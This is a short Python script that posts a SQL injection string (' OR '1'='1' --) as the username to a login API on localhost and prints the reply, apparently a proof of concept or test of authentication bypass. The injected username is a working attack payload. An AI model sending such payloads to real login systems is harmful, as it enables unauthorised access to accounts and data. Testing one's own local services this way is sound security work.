import requests

response = requests.post(
    "http://127.0.0.1:5000/api/v1/login",
    json={"username": "' OR '1'='1' --", "password": ""},
)
print(response.text)
